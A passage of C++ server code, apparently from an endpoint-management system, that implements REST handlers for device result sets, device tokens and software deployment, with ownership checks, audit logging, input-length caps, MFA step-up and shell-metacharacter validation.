            audit_fn(req, "result_set.create", "success", "ResultSet", created->id,
                     std::string(src_kind) + " execution_id=" + exec_id +
                         " agents=" + std::to_string(sent));
            // 202 Accepted: membership is not known yet; the client polls
            // GET /{id} (status flips pending→materialized) or subscribes to
            // /api/v1/events on source_execution_id.
            res.status = 202;
            res.set_content(ok_json(rs_to_json(*created)), "application/json");
        };

        // GET /api/v1/result-sets — owner-scoped list.
        sink.Get("/api/v1/result-sets", [auth_fn, result_set_store, rs_to_json](
                                            const httplib::Request& req, httplib::Response& res) {
            auto session = auth_fn(req, res);
            if (!session)
                return;
            std::string cursor = req.has_param("cursor") ? req.get_param_value("cursor") : "";
            int limit = 50;
            if (req.has_param("limit")) {
                const auto lv = req.get_param_value("limit");
                int v = 0;
                std::from_chars(lv.data(), lv.data() + lv.size(), v);
                if (v > 0 && v <= 500)
                    limit = v;
            }
            std::string next;
            auto sets = result_set_store->list_by_owner(session->username, cursor, limit, next);
            JArr arr;
            for (const auto& s : sets)
                arr.add_raw(rs_to_json(s));
            auto data =
                JObj().raw("result_sets", arr.str()).add("next_cursor", next).str();
            res.set_content(ok_json(data), "application/json");
        });

        // POST /api/v1/result-sets — direct create from pre-computed device ids
        // (e.g. dashboard "I have a CSV"). Synchronous → lands materialized.
        sink.Post("/api/v1/result-sets",
                  [auth_fn, audit_fn, result_set_store, metrics_registry, rs_to_json, rs_err,
                   load_owned](const httplib::Request& req, httplib::Response& res) {
            auto session = auth_fn(req, res);
            if (!session)
                return;
            auto body = nlohmann::json::parse(req.body, nullptr, false);
            if (body.is_discarded()) {
                rs_err(res, 400, "invalid JSON");
                return;
            }
            CreateRequest cr;
            cr.owner_principal = session->username;
            cr.name = body.value("name", "");
            cr.source_kind = body.value("source_kind", std::string(source_kind::kManualCurate));
            cr.source_payload = body.contains("source_payload") ? body["source_payload"].dump()
                                                                : std::string("{}");
            if (body.contains("parent_id") && body["parent_id"].is_string() &&
                !body["parent_id"].get<std::string>().empty()) {
                auto pid = body["parent_id"].get<std::string>();
                // Owner-check the parent before persisting the lineage edge,
                // else an operator can parent onto a victim's id and read its
                // name/source_kind/device_count back via /lineage (review B2).
                if (!load_owned(req, pid, session->username, res))
                    return; // load_owned wrote 404
                cr.parent_id = pid;
            }

            std::vector<std::string> members;
            if (body.contains("device_ids") && body["device_ids"].is_array()) {
                for (const auto& d : body["device_ids"])
                    if (d.is_string())
                        members.push_back(d.get<std::string>());
            }
            // Reject an oversized array before the store dedups it under its
            // write lock — bounds the DoS from a giant device_ids body (B4).
            if (members.size() > static_cast<size_t>(ResultSetStore::kMaxMembersPerSet)) {
                if (metrics_registry)
                    metrics_registry->counter("yuzu_result_set_quota_rejected").increment();
                rs_err(res, 400, to_string(ResultSetError::TooManyMembers));
                return;
            }

            auto created = result_set_store->create_materialized(cr, members);
            if (!created) {
                if (metrics_registry && created.error() == ResultSetError::QuotaExceeded)
                    metrics_registry->counter("yuzu_result_set_quota_rejected").increment();
                int status = created.error() == ResultSetError::QuotaExceeded ? 429 : 400;
                rs_err(res, status, to_string(created.error()));
                return;
            }
            if (metrics_registry)
                metrics_registry
                    ->counter("yuzu_result_sets_total",
                              {{"source_kind", cr.source_kind}, {"result", "created"}})
                    .increment();
            audit_fn(req, "result_set.create", "success", "ResultSet", created->id, cr.source_kind);
            res.status = 201;
            res.set_content(ok_json(rs_to_json(*created)), "application/json");
        });

        // POST /api/v1/result-sets/from-inventory-query — synchronous producer.
        // Runs the inventory evaluation server-side; the member set is every
        // agent that matched. When parent_id is given, the candidate set is
        // narrowed to that set's current members.
        sink.Post("/api/v1/result-sets/from-inventory-query",
                  [auth_fn, audit_fn, result_set_store, inventory_store, metrics_registry,
                   rs_to_json, rs_err,
                   load_owned](const httplib::Request& req, httplib::Response& res) {
                      auto session = auth_fn(req, res);
                      if (!session)
                          return;
                      if (!inventory_store || !inventory_store->is_open()) {
                          rs_err(res, 503, "inventory store not available");
                          return;
                      }
                      auto body = nlohmann::json::parse(req.body, nullptr, false);
                      if (body.is_discarded()) {
                          rs_err(res, 400, "invalid JSON");
                          return;
                      }

                      InventoryEvalRequest eval_req;
                      eval_req.combine = body.value("combine", "all");
                      if (body.contains("conditions") && body["conditions"].is_array()) {
                          for (const auto& c : body["conditions"]) {
                              InventoryCondition cond;
                              cond.plugin = c.value("plugin", "");
                              cond.field = c.value("field", "");
                              cond.op = c.value("op", "");
                              cond.value = c.value("value", "");
                              eval_req.conditions.push_back(std::move(cond));
                          }
                      }

                      // Optional parent-scope narrowing.
                      std::optional<std::unordered_set<std::string>> parent_members;
                      CreateRequest cr;
                      cr.owner_principal = session->username;
                      cr.name = body.value("name", "");
                      cr.source_kind = std::string(source_kind::kInventoryQuery);
                      cr.source_payload = body.dump();
                      if (body.contains("parent_id") && body["parent_id"].is_string() &&
                          !body["parent_id"].get<std::string>().empty()) {
                          auto pid = body["parent_id"].get<std::string>();
                          auto parent = load_owned(req, pid, session->username, res);
                          if (!parent)
                              return; // load_owned already wrote 404
                          cr.parent_id = pid;
                          std::unordered_set<std::string> ms;
                          std::string cur;
                          while (true) {
                              // Separate in/out cursor: members() clears its
                              // out-cursor first, so aliasing one variable as
                              // both rereads page 1 forever once the parent
                              // exceeds the page size (review finding B3).
                              std::string next;
                              auto page = result_set_store->members(pid, cur, 5000, next);
                              ms.insert(page.begin(), page.end());
                              if (next.empty())
                                  break;
                              cur = std::move(next);
                          }
                          parent_members = std::move(ms);
                      }

                      InventoryQuery iq;
                      iq.limit = 5000;
                      auto records_raw = inventory_store->query(iq);
                      std::vector<std::pair<std::string, std::string>> records;
                      records.reserve(records_raw.size());
                      for (const auto& r : records_raw)
                          records.emplace_back(r.agent_id + "|" + r.plugin, r.data_json);

                      auto results = evaluate_inventory(eval_req, records);
                      std::unordered_set<std::string> seen;
                      std::vector<std::string> members;
                      for (const auto& r : results) {
                          if (!r.match)
                              continue;
                          if (parent_members && !parent_members->count(r.agent_id))
                              continue;
                          if (seen.insert(r.agent_id).second)
                              members.push_back(r.agent_id);
                      }

                      auto created = result_set_store->create_materialized(cr, members);
                      if (!created) {
                          if (metrics_registry &&
                              created.error() == ResultSetError::QuotaExceeded)
                              metrics_registry->counter("yuzu_result_set_quota_rejected")
                                  .increment();
                          int status =
                              created.error() == ResultSetError::QuotaExceeded ? 429 : 400;
                          rs_err(res, status, to_string(created.error()));
                          return;
                      }
                      if (metrics_registry)
                          metrics_registry
                              ->counter("yuzu_result_sets_total",
                                        {{"source_kind", cr.source_kind}, {"result", "created"}})
                              .increment();
                      audit_fn(req, "result_set.create", "success", "ResultSet", created->id,
                               cr.source_kind);
                      res.status = 201;
                      res.set_content(ok_json(rs_to_json(*created)), "application/json");
                  });

        // POST /api/v1/result-sets/from-tar-query — async producer (design §6).
        // Dispatches operator SQL to the tar plugin in parent_id's scope (or
        // __all__); the membership set is every agent that returned ≥1 row
        // (default) or every SUCCESS responder (`include_empty=true`). The
        // SQL is sandboxed AGENT-side by TarDatabase::execute_user_query
        // (read-only authorizer, #760/#631) — the server only length-checks.
        sink.Post("/api/v1/result-sets/from-tar-query",
                  [auth_fn, rs_err, run_async](const httplib::Request& req,
                                               httplib::Response& res) {
                      auto session = auth_fn(req, res);
                      if (!session)
                          return;
                      auto body = nlohmann::json::parse(req.body, nullptr, false);
                      if (body.is_discarded()) {
                          rs_err(res, 400, "invalid JSON");
                          return;
                      }
                      std::string sql = body.value("sql", "");
                      if (sql.empty()) {
                          rs_err(res, 400, "RESULT_SET_BAD_REQUEST: 'sql' is required");
                          return;
                      }
                      if (sql.size() > 100000) {
                          rs_err(res, 400, "RESULT_SET_BAD_REQUEST: 'sql' exceeds 100 KiB");
                          return;
                      }
                      const bool include_empty = body.value("include_empty", false);
                      nlohmann::json matcher =
                          include_empty ? nlohmann::json{{"kind", "any_response"}}
                                        : nlohmann::json{{"kind", "tar_rows_ge"}, {"n", 1}};
                      // source_payload — design §3.2 tar_query shape (re-eval reads it).
                      nlohmann::json payload;
                      payload["sql"] = sql;
                      payload["include_empty"] = include_empty;
                      if (body.contains("parent_id") && body["parent_id"].is_string())
                          payload["scope_input_id"] = body["parent_id"];
                      std::unordered_map<std::string, std::string> params{{"sql", sql}};
                      run_async(req, res, session->username, "tar", "sql", params,
                                source_kind::kTarQuery, payload.dump(), matcher.dump(), body,
                                body.value("name", ""));
                  });

        // POST /api/v1/result-sets/from-instruction-result — async producer.
        // Runs an InstructionDefinition in parent_id's scope; membership is the
        // responders whose output row satisfies the operator-supplied `matcher`
        // (column/op/value — design §3.2, applied by the maintenance thread via
        // rs_matcher). Mirrors the Chrome-IR hash-check step (design §10).
        sink.Post("/api/v1/result-sets/from-instruction-result",
                  [auth_fn, rs_err, instruction_store, run_async](const httplib::Request& req,
                                                                  httplib::Response& res) {
                      auto session = auth_fn(req, res);
                      if (!session)
                          return;
                      if (!instruction_store || !instruction_store->is_open()) {
                          rs_err(res, 503, "instruction store not available");
                          return;
                      }
                      auto body = nlohmann::json::parse(req.body, nullptr, false);
                      if (body.is_discarded()) {
                          rs_err(res, 400, "invalid JSON");
                          return;
                      }
                      std::string instruction_id = body.value("instruction_id", "");
                      if (instruction_id.empty()) {
                          rs_err(res, 400, "RESULT_SET_BAD_REQUEST: 'instruction_id' is required");
                          return;
                      }
                      auto def = instruction_store->get_definition(instruction_id);
                      if (!def) {
                          rs_err(res, 404, "INSTRUCTION_NOT_FOUND: unknown instruction_id");
                          return;
                      }
                      std::unordered_map<std::string, std::string> params;
                      if (body.contains("params") && body["params"].is_object())
                          for (auto& [k, v] : body["params"].items())
                              params[k] = v.is_string() ? v.get<std::string>() : v.dump();
                      std::string matcher = (body.contains("matcher") && body["matcher"].is_object())
                                                ? body["matcher"].dump()
                                                : std::string();
                      // source_payload — design §3.2 instruction_result shape.
                      nlohmann::json payload;
                      payload["instruction_id"] = instruction_id;
                      payload["params"] =
                          body.contains("params") ? body["params"] : nlohmann::json::object();
                      if (body.contains("matcher"))
                          payload["matcher"] = body["matcher"];
                      if (body.contains("parent_id") && body["parent_id"].is_string())
                          payload["scope_input_id"] = body["parent_id"];
                      run_async(req, res, session->username, def->plugin, def->action, params,
                                source_kind::kInstructionResult, payload.dump(), matcher, body,
                                body.value("name", ""));
                  });

        // POST /api/v1/result-sets/{id}/re-eval — re-run the source query and
        // create a SIBLING set (parent_id = original.parent_id, NOT a child —
        // design §6/§11). Async sources (tar_query/instruction_result) re-
        // dispatch and land a new pending row; sync sources are deferred to
        // PR-G (their re-eval needs the inventory evaluator on this path).
        sink.Post(R"(/api/v1/result-sets/(rs_[0-9a-f]+)/re-eval)",
                  [auth_fn, audit_fn, rs_err, load_owned, run_async, instruction_store](
                      const httplib::Request& req, httplib::Response& res) {
                      auto session = auth_fn(req, res);
                      if (!session)
                          return;
                      auto id = req.matches[1].str();
                      auto orig = load_owned(req, id, session->username, res);
                      if (!orig)
                          return;
                      auto sp = nlohmann::json::parse(orig->source_payload, nullptr, false);
                      // Synthesise the parent so the sibling shares the
                      // original's parent (re-eval re-asks the same question
                      // against the same candidate scope, today's estate).
                      nlohmann::json synth;
                      if (orig->parent_id && !orig->parent_id->empty())
                          synth["parent_id"] = *orig->parent_id;
                      // Skip the suffix if it's already there, else repeated
                      // re-evals of a sibling grow "foo (re-eval) (re-eval) …"
                      // unboundedly (review finding bug_014).
                      const std::string reeval_name =
                          orig->name.empty()                  ? std::string()
                          : orig->name.ends_with(" (re-eval)") ? orig->name
                                                               : (orig->name + " (re-eval)");
                      if (orig->source_kind == source_kind::kTarQuery) {
                          std::string sql = sp.is_object() ? sp.value("sql", "") : "";
                          if (sql.empty()) {
                              rs_err(res, 400, "RESULT_SET_BAD_REQUEST: original carries no SQL");
                              return;
                          }
                          std::unordered_map<std::string, std::string> params{{"sql", sql}};
                          run_async(req, res, session->username, "tar", "sql", params,
                                    source_kind::kTarQuery, orig->source_payload, orig->matcher,
                                    synth, reeval_name);
                      } else if (orig->source_kind == source_kind::kInstructionResult) {
                          std::string instruction_id =
                              sp.is_object() ? sp.value("instruction_id", "") : "";
                          auto def = instruction_store && instruction_store->is_open()
                                         ? instruction_store->get_definition(instruction_id)
                                         : std::nullopt;
                          if (instruction_id.empty() || !def) {
                              rs_err(res, 400,
                                     "RESULT_SET_BAD_REQUEST: original instruction unavailable");
                              return;
                          }
                          std::unordered_map<std::string, std::string> params;
                          if (sp.contains("params") && sp["params"].is_object())
                              for (auto& [k, v] : sp["params"].items())
                                  params[k] = v.is_string() ? v.get<std::string>() : v.dump();
                          run_async(req, res, session->username, def->plugin, def->action, params,
                                    source_kind::kInstructionResult, orig->source_payload,
                                    orig->matcher, synth, reeval_name);
                      } else {
                          rs_err(res, 400,
                                 "RESULT_SET_REEVAL_UNSUPPORTED: re-eval of this source_kind "
                                 "lands in PR-G");
                      }
                      // Forensic edge (design §9): run_async already audited the
                      // sibling's result_set.create; this row links the sibling back
                      // to the original so a lineage walk shows the refresh.
                      // device_count_delta is not yet known — the sibling lands
                      // `pending` and materialises asynchronously.
                      if (res.status == 202) {
                          auto rebody = nlohmann::json::parse(res.body, nullptr, false);
                          const std::string new_id =
                              (rebody.is_object() && rebody.contains("data") &&
                               rebody["data"].is_object())
                                  ? rebody["data"].value("id", "")
                                  : "";
                          audit_fn(req, "result_set.live_reeval", "success", "ResultSet", orig->id,
                                   "new_id=" + new_id + " source_kind=" + orig->source_kind);
                      }
                  });

        // GET /api/v1/result-sets/{id}
        sink.Get(R"(/api/v1/result-sets/(rs_[0-9a-f]+))",
                 [auth_fn, rs_to_json, load_owned](const httplib::Request& req,
                                                   httplib::Response& res) {
                     auto session = auth_fn(req, res);
                     if (!session)
                         return;
                     auto row = load_owned(req, req.matches[1].str(), session->username, res);
                     if (!row)
                         return;
                     res.set_content(ok_json(rs_to_json(*row)), "application/json");
                 });

        // GET /api/v1/result-sets/{id}/members
        sink.Get(R"(/api/v1/result-sets/(rs_[0-9a-f]+)/members)",
                 [auth_fn, result_set_store, load_owned](const httplib::Request& req,
                                                         httplib::Response& res) {
                     auto session = auth_fn(req, res);
                     if (!session)
                         return;
                     auto id = req.matches[1].str();
                     auto row = load_owned(req, id, session->username, res);
                     if (!row)
                         return;
                     std::string cursor =
                         req.has_param("cursor") ? req.get_param_value("cursor") : "";
                     int limit = 1000;
                     if (req.has_param("limit")) {
                         const auto lv = req.get_param_value("limit");
                         int v = 0;
                         std::from_chars(lv.data(), lv.data() + lv.size(), v);
                         if (v > 0 && v <= 10000)
                             limit = v;
                     }
                     std::string next;
                     auto devs = result_set_store->members(id, cursor, limit, next);
                     JArr arr;
                     for (const auto& d : devs)
                         arr.add(d);
                     auto data =
                         JObj().raw("device_ids", arr.str()).add("next_cursor", next).str();
                     res.set_content(ok_json(data), "application/json");
                 });

        // GET /api/v1/result-sets/{id}/lineage
        sink.Get(R"(/api/v1/result-sets/(rs_[0-9a-f]+)/lineage)",
                 [auth_fn, result_set_store, load_owned](const httplib::Request& req,
                                                         httplib::Response& res) {
                     auto session = auth_fn(req, res);
                     if (!session)
                         return;
                     auto id = req.matches[1].str();
                     auto row = load_owned(req, id, session->username, res);
                     if (!row)
                         return;
                     auto chain = result_set_store->lineage(id, session->username);
                     JArr arr;
                     for (const auto& n : chain)
                         arr.add(JObj()
                                     .add("id", n.id)
                                     .add("name", n.name)
                                     .add("source_kind", n.source_kind)
                                     .add("device_count", n.device_count));
                     res.set_content(ok_json(JObj().raw("chain", arr.str()).str()),
                                     "application/json");
                 });

        // POST /api/v1/result-sets/{id}/pin
        sink.Post(R"(/api/v1/result-sets/(rs_[0-9a-f]+)/pin)",
                  [auth_fn, audit_fn, result_set_store, rs_to_json, rs_err,
                   load_owned](const httplib::Request& req, httplib::Response& res) {
                      auto session = auth_fn(req, res);
                      if (!session)
                          return;
                      auto id = req.matches[1].str();
                      auto row = load_owned(req, id, session->username, res);
                      if (!row)
                          return;
                      auto pinned = result_set_store->pin(id);
                      if (!pinned) {
                          int status = pinned.error() == ResultSetError::PinLimit ? 409 : 404;
                          rs_err(res, status, to_string(pinned.error()));
                          return;
                      }
                      audit_fn(req, "result_set.pin", "success", "ResultSet", id, "");
                      res.set_content(ok_json(rs_to_json(*pinned)), "application/json");
                  });

        // POST /api/v1/result-sets/{id}/unpin
        sink.Post(R"(/api/v1/result-sets/(rs_[0-9a-f]+)/unpin)",
                  [auth_fn, audit_fn, result_set_store, rs_to_json, rs_err,
                   load_owned](const httplib::Request& req, httplib::Response& res) {
                      auto session = auth_fn(req, res);
                      if (!session)
                          return;
                      auto id = req.matches[1].str();
                      auto row = load_owned(req, id, session->username, res);
                      if (!row)
                          return;
                      auto unpinned = result_set_store->unpin(id);
                      if (!unpinned) {
                          rs_err(res, 404, to_string(unpinned.error()));
                          return;
                      }
                      audit_fn(req, "result_set.unpin", "success", "ResultSet", id, "");
                      res.set_content(ok_json(rs_to_json(*unpinned)), "application/json");
                  });

        // DELETE /api/v1/result-sets/{id}
        sink.Delete(R"(/api/v1/result-sets/(rs_[0-9a-f]+))",
                    [auth_fn, audit_fn, result_set_store, rs_err,
                     load_owned](const httplib::Request& req, httplib::Response& res) {
                        auto session = auth_fn(req, res);
                        if (!session)
                            return;
                        auto id = req.matches[1].str();
                        auto row = load_owned(req, id, session->username, res);
                        if (!row)
                            return;
                        auto del = result_set_store->delete_set(id);
                        if (!del) {
                            // Pinned sets must be unpinned first (design §6).
                            int status = del.error() == ResultSetError::Pinned ? 409 : 404;
                            rs_err(res, status, to_string(del.error()));
                            return;
                        }
                        audit_fn(req, "result_set.delete", "success", "ResultSet", id, "");
                        res.status = 200;
                        res.set_content(ok_json(JObj().add("deleted", true).str()),
                                        "application/json");
                    });
    }

    // ── Device Authorization Tokens (capability 18.8) ─────────────────────

    if (device_token_store) {
        sink.Get("/api/v1/device-tokens", [auth_fn, perm_fn, device_token_store](
                                              const httplib::Request& req, httplib::Response& res) {
            if (!perm_fn(req, res, "DeviceToken", "Read"))
                return;
            auto session = auth_fn(req, res);
            if (!session)
                return;
            auto tokens = device_token_store->list_tokens();
            JArr arr;
            for (const auto& t : tokens) {
                arr.add(JObj()
                            .add("token_id", t.token_id)
                            .add("name", t.name)
                            .add("principal_id", t.principal_id)
                            .add("device_id", t.device_id)
                            .add("definition_id", t.definition_id)
                            .add("created_at", t.created_at)
                            .add("expires_at", t.expires_at)
                            .add("last_used_at", t.last_used_at)
                            .add("revoked", t.revoked));
            }
            res.set_content(list_json(arr.str(), static_cast<int64_t>(tokens.size())),
                            "application/json");
        });

        sink.Post("/api/v1/device-tokens", [auth_fn, perm_fn, audit_fn, device_token_store,
                                            metrics_registry](const httplib::Request& req,
                                                              httplib::Response& res) {
            auto session = auth_fn(req, res);
            if (!session)
                return;
            if (!perm_fn(req, res, "DeviceToken", "Write"))
                return;
            auto body = nlohmann::json::parse(req.body, nullptr, false);
            if (body.is_discarded()) {
                res.status = 400;
                res.set_content(error_json("invalid JSON"), "application/json");
                return;
            }
            auto name = body.value("name", "");
            auto device_id = body.value("device_id", "");
            auto definition_id = body.value("definition_id", "");
            int64_t expires_at = body.value("expires_at", int64_t{0});

            // UP-H2 (gov Gate 4, unhappy-path): clamp user-controlled
            // string length on `name`, `device_id`, and `definition_id`
            // BEFORE any audit emission. Same DoS-via-oversized-payload
            // class as the /api/v1/tokens site — see comment there for
            // the full rationale. device_id is bound into the audit row
            // as target_id, so it's the highest-priority field to clamp,
            // but name and definition_id ride the same SQLite bind path.
            if (name.size() > 256) {
                res.status = 400;
                res.set_content(error_json("invalid_input_length: name exceeds 256 chars"),
                                "application/json");
                return;
            }
            if (device_id.size() > 256) {
                res.status = 400;
                res.set_content(error_json("invalid_input_length: device_id exceeds 256 chars"),
                                "application/json");
                return;
            }
            if (definition_id.size() > 256) {
                res.status = 400;
                res.set_content(error_json("invalid_input_length: definition_id exceeds 256 chars"),
                                "application/json");
                return;
            }

            auto result = device_token_store->create_token(name, session->username, device_id,
                                                           definition_id, expires_at);
            if (!result) {
                // sre-1: Prometheus signal for CSPRNG failure (see
                // /api/v1/tokens comment for full rationale).
                if (metrics_registry) {
                    metrics_registry
                        ->counter("yuzu_secure_random_failure_total",
                                  {{"reason", "prng_failure"}, {"site", "device_token"}})
                        .increment();
                }
                // F-002 (gov Gate 2, security-guardian): same audit
                // gap as POST /api/v1/tokens — CSPRNG failure on
                // device-token issuance silently dropped the audit
                // row. SOC 2 CC7.2/CC7.3 require this surface to
                // be auditable. `device_id` is the natural target_id
                // for a device-scoped token (matches the eventual
                // success-path subject) and `csprng_unavailable:`
                // is the SIEM marker.
                //
                // UP-H1 (gov Gate 4): wrap audit in try/catch and
                // capture bool return so a wedged AuditStore surfaces
                // as Sec-Audit-Failed: true header + audit_emitted=false
                // envelope field. See /api/v1/tokens for the full
                // rationale.
                bool audit_emitted = false;
                try {
                    audit_emitted = audit_fn(req, "device_token.create", "failure", "DeviceToken",
                                             device_id, "csprng_unavailable: " + result.error());
                } catch (const std::exception& ex) {
                    spdlog::error("device_token.create audit emission threw: {}", ex.what());
                    audit_emitted = false;
                } catch (...) {
                    spdlog::error("device_token.create audit emission threw unknown");
                    audit_emitted = false;
                }
                // sre-2: 503 + Retry-After: 5 (entropy is server-side,
                // not client error). Closes #1046.
                res.status = 503;
                res.set_header("Retry-After", "5");
                if (!audit_emitted)
                    res.set_header("Sec-Audit-Failed", "true");
                JObj envelope_err;
                envelope_err.add("code", 503)
                    .add("message", "CSPRNG unavailable: " + result.error());
                JObj envelope;
                envelope.raw("error", envelope_err.str())
                    .add("audit_emitted", audit_emitted)
                    .raw("meta", R"({"api_version":"v1"})");
                res.set_content(envelope.str(), "application/json");
                return;
            }
            (void)audit_fn(req, "device_token.create", "success", "DeviceToken", "", name);
            res.status = 201;
            res.set_content(ok_json(JObj().add("raw_token", *result).str()), "application/json");
        });

        sink.Delete(
            R"(/api/v1/device-tokens/([a-f0-9]+))",
            [auth_fn, perm_fn, audit_fn, device_token_store](const httplib::Request& req,
                                                             httplib::Response& res) {
                auto session = auth_fn(req, res);
                if (!session)
                    return;
                if (!perm_fn(req, res, "DeviceToken", "Delete"))
                    return;
                auto token_id = req.matches[1].str();
                if (device_token_store->revoke_token(token_id)) {
                    audit_fn(req, "device_token.revoke", "success", "DeviceToken", token_id, "");
                    res.set_content(ok_json(JObj().add("revoked", true).str()), "application/json");
                } else {
                    res.status = 404;
                    res.set_content(error_json("token not found"), "application/json");
                }
            });
    }

    // ── Software Deployment (capability 7.6) ──────────────────────────────

    if (sw_deploy_store) {
        sink.Get("/api/v1/software-packages",
                 [perm_fn, sw_deploy_store](const httplib::Request& req, httplib::Response& res) {
                     if (!perm_fn(req, res, "SoftwareDeployment", "Read"))
                         return;
                     auto pkgs = sw_deploy_store->list_packages();
                     JArr arr;
                     for (const auto& p : pkgs) {
                         arr.add(JObj()
                                     .add("id", p.id)
                                     .add("name", p.name)
                                     .add("version", p.version)
                                     .add("platform", p.platform)
                                     .add("installer_type", p.installer_type)
                                     .add("content_hash", p.content_hash)
                                     .add("size_bytes", p.size_bytes)
                                     .add("created_at", p.created_at)
                                     .add("created_by", p.created_by));
                     }
                     res.set_content(list_json(arr.str(), static_cast<int64_t>(pkgs.size())),
                                     "application/json");
                 });

        sink.Post("/api/v1/software-packages", [auth_fn, perm_fn, audit_fn, step_up_fn,
                                                sw_deploy_store](const httplib::Request& req,
                                                                 httplib::Response& res) {
            auto session = auth_fn(req, res);
            if (!session)
                return;
            if (!perm_fn(req, res, "SoftwareDeployment", "Write"))
                return;
            // PR2 — MFA step-up gate. Uploading a software package
            // introduces executable content into the fleet; require
            // fresh MFA proof.
            if (step_up_fn && !step_up_fn(req, res, *session, "POST /api/v1/software-packages"))
                return;
            auto body = nlohmann::json::parse(req.body, nullptr, false);
            if (body.is_discarded()) {
                res.status = 400;
                res.set_content(error_json("invalid JSON"), "application/json");
                return;
            }

            // Helper: emit a rejection-audit row AND set Sec-Audit-Failed
            // header if the audit_fn signals failure. Matches the W1.1 /
            // PR #883 pattern used by the session-revoke handlers — the
            // operator must learn from the response whether the security
            // event was actually persisted.
            auto emit_denial = [&](const char* detail_msg) {
                bool emitted = audit_fn(req, "software_package.create", "denied", "SoftwarePackage",
                                        "", detail_msg);
                if (!emitted)
                    res.set_header("Sec-Audit-Failed", "true");
            };

            SoftwarePackage pkg;
            try {
                auto pkg_name = body.value("name", "");
                auto pkg_version = body.value("version", "");
                if (pkg_name.empty() || pkg_version.empty()) {
                    res.status = 400;
                    res.set_content(error_json("name and version are required"),
                                    "application/json");
                    return;
                }
                pkg.name = pkg_name;
                pkg.version = pkg_version;
                pkg.platform = body.value("platform", "windows");
                pkg.installer_type = body.value("installer_type", "msi");
                pkg.content_hash = body.value("content_hash", "");
                pkg.content_url = body.value("content_url", "");
                pkg.silent_args = body.value("silent_args", "");
                pkg.verify_command = body.value("verify_command", "");
                pkg.rollback_command = body.value("rollback_command", "");
                pkg.size_bytes = body.value("size_bytes", int64_t{0});
            } catch (const nlohmann::json::exception& e) {
                // body.value throws json::type_error when a present field is
                // the wrong JSON type (e.g. {"verify_command": 42}). Without
                // this catch the exception escapes the lambda → httplib
                // returns 500 with no audit trail. Audit + 400 instead.
                emit_denial("payload field has wrong JSON type — string expected");
                res.status = 400;
                res.set_content(error_json(std::string{"invalid field type: "} + e.what()),
                                "application/json");
                return;
            }
            pkg.created_by = session->username;

            // #771 / W7.5: reject install commands containing shell metachars
            // BEFORE they reach the store. All three free-form fields
            // (verify_command, rollback_command, silent_args) share the same
            // dispatch threat model — silent_args is concatenated into the
            // installer argv, verify+rollback are full command lines. Audit
            // the rejection as a security event so an operator scoping the
            // fleet-RCE surface sees the attempted injection in the audit log
            // even though the package was never persisted.
            constexpr const char* kInputErr =
                " contains forbidden characters (shell metacharacters ; & | ` $ < > ( ) "
                "or control characters blocked) or exceeds 512-char length cap";
            if (!is_safe_install_command(pkg.verify_command)) {
                emit_denial("verify_command contains shell metacharacters / control chars or "
                            "exceeds length cap");
                res.status = 400;
                res.set_content(error_json(std::string{"verify_command"} + kInputErr),
                                "application/json");
                return;
            }
            if (!is_safe_install_command(pkg.rollback_command)) {
                emit_denial("rollback_command contains shell metacharacters / control chars or "
                            "exceeds length cap");
                res.status = 400;
                res.set_content(error_json(std::string{"rollback_command"} + kInputErr),
                                "application/json");
                return;
            }
            if (!is_safe_install_command(pkg.silent_args)) {
                // silent_args is the same attack vector as verify/rollback —
                // it's concatenated into the installer argv on dispatch. The
                // round-1 consistency review flagged this as the exact
                // #1072 → #1073 sibling-gap pattern. Block here too.
                emit_denial("silent_args contains shell metacharacters / control chars or "
                            "exceeds length cap");
                res.status = 400;
                res.set_content(error_json(std::string{"silent_args"} + kInputErr),
                                "application/json");
                return;
            }

            auto result = sw_deploy_store->create_package(pkg);
            if (!result) {
                res.status = 400;
                res.set_content(error_json(result.error()), "application/json");
                return;
            }
            audit_fn(req, "software_package.create", "success", "SoftwarePackage", *result,
                     pkg.name);
            res.status = 201;
            res.set_content(ok_json(JObj().add("id", *result).str()), "application/json");
        });

        sink.Get("/api/v1/software-deployments", [perm_fn,
                                                  sw_deploy_store](const httplib::Request& req,
                                                                   httplib::Response& res) {
            if (!perm_fn(req, res, "SoftwareDeployment", "Read"))
                return;
            auto status = req.has_param("status") ? req.get_param_value("status") : std::string{};
            auto deps = sw_deploy_store->list_deployments(status);
            JArr arr;
            for (const auto& d : deps) {
                arr.add(JObj()
                            .add("id", d.id)
                            .add("package_id", d.package_id)
                            .add("status", d.status)
                            .add("created_by", d.created_by)
                            .add("created_at", d.created_at)
                            .add("started_at", d.started_at)
                            .add("completed_at", d.completed_at)
                            .add("agents_targeted", static_cast<int64_t>(d.agents_targeted))
                            .add("agents_success", static_cast<int64_t>(d.agents_success))
                            .add("agents_failure", static_cast<int64_t>(d.agents_failure)));
            }
            res.set_content(list_json(arr.str(), static_cast<int64_t>(deps.size())),
                            "application/json");
        });

        sink.Post("/api/v1/software-deployments",
                  [auth_fn, perm_fn, audit_fn, sw_deploy_store](const httplib::Request& req,
                                                                httplib::Response& res) {
                      auto session = auth_fn(req, res);
                      if (!session)
                          return;
                      if (!perm_fn(req, res, "SoftwareDeployment", "Execute"))
                          return;
                      auto body = nlohmann::json::parse(req.body, nullptr, false);
                      if (body.is_discarded()) {
                          res.status = 400;
                          res.set_content(error_json("invalid JSON"), "application/json");
                          return;
                      }
                      SoftwareDeployment dep;
                      dep.package_id = body.value("package_id", "");
                      dep.scope_expression = body.value("scope_expression", "");
                      dep.created_by = session->username;
                      auto result = sw_deploy_store->create_deployment(dep);
                      if (!result) {
                          res.status = 400;
                          res.set_content(error_json(result.error()), "application/json");
                          return;
                      }
                      audit_fn(req, "software_deployment.create", "success", "SoftwareDeployment",
                               *result, "");
                      res.status = 201;
                      res.set_content(ok_json(JObj().add("id", *result).str()), "application/json");
                  });

        sink.Post(
            R"(/api/v1/software-deployments/([a-f0-9]+)/start)",
            [auth_fn, perm_fn, audit_fn, step_up_fn, sw_deploy_store](
                const httplib::Request& req, httplib::Response& res) {
                auto session = auth_fn(req, res);
                if (!session)
                    return;
                if (!perm_fn(req, res, "SoftwareDeployment", "Execute"))
                    return;
                // PR2 — MFA step-up gate. Starting a deployment pushes
                // packages onto live endpoints; require fresh MFA proof.
                if (step_up_fn &&
                    !step_up_fn(req, res, *session, "POST /api/v1/software-deployments/{id}/start"))
                    return;
                auto id = req.matches[1].str();
                if (sw_deploy_store->start_deployment(id)) {
                    audit_fn(req, "software_deployment.start", "success", "SoftwareDeployment", id,
                             "");
                    res.set_content(ok_json(JObj().add("started", true).str()), "application/json");
                } else {
                    res.status = 400;
                    res.set_content(error_json("cannot start deployment"), "application/json");
                }
            });

